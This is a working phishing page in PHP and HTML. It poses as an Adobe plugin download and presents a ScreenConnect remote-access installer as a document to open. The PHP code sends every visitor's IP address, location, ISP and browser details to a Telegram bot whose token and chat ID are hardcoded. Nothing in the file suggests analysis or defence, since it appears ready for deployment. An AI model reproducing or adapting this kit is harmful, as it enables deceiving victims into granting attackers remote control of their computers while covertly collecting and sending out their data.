<?php
// Telegram Configuration
$botToken = '8913856283:AAGBVU6Ef6jrN26W9sxYHqCQNZr4nnwpaXI';
$chatID = '8608186168';

// File to download
$fileName = 'Adobe.Installler.exe';

// Collect visitor data
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

// Get geolocation
$geo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);

// Create Telegram message
$message = "🚨 New Download Triggered 🚨\n";
$message .= "▫️ Time: {$time}\n";
$message .= "▫️ IP: {$ip}\n";
$message .= "▫️ Location: " . ($geo['city'] ?? 'Unknown') . ", " . ($geo['country'] ?? 'Unknown') . "\n";
$message .= "▫️ ISP: " . ($geo['isp'] ?? 'Unknown') . "\n";
$message .= "▫️ Device: {$ua}";

// Send to Telegram
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$data = ['chat_id' => $chatID, 'text' => $message];
$options = [
    'http' => [
        'method'  => 'POST',
        'content' => http_build_query($data)
    ]
];
file_get_contents($url, false, stream_context_create($options));
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Plugin Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            background-color: #f5f5f5;
            padding-top: 15vh;
        }
        .container {
            text-align: center;
            max-width: 600px;
            margin-top: 0;
        }
        img {
            width: 150px;
            margin-bottom: 20px;
        }
        a {
            color: #d32f2f;
            text-decoration: none;
            font-weight: bold;
        }
        a:hover {
            text-decoration: underline;
        }
        p {
            line-height: 1.6;
            margin: 0;
            padding: 0 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="adobeicon.png" alt="Adobe Icon">
        <p>CONGRATS!!!, Your download has been Successfully Completed.<br>
        To Access Document.<br><br>
        Open Project 562026 from recent downloads (right corner of this screen) . <a href="https://hawk-insurance.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest">Download manually</a>.<br><br>
        Download not working? <a href="https://hawk-insurance.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest">Restart and Download | Get Help</a></p>
    </div>
    
    <!-- Hidden iframe to trigger download after page loads -->
    <iframe src="" style="display:none;"></iframe>
</body>
</html>